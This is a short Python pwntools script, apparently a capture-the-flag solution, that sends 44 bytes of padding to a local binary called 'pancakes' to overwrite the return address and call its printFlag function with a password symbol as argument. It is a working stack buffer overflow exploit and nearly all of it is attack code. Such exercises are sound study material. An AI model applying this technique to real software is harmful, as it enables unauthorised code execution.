from pwn import *

buffer_size = 44

elf = ELF('./pancakes')
print_flag_address = elf.symbols['printFlag']
password_address = elf.symbols['password']

app = process("./pancakes")
app.sendlineafter("> ", 'a' * buffer_size + p32(print_flag_address) + 'xxxx'+ p32(password_address))

app.readline()
print(app.readline())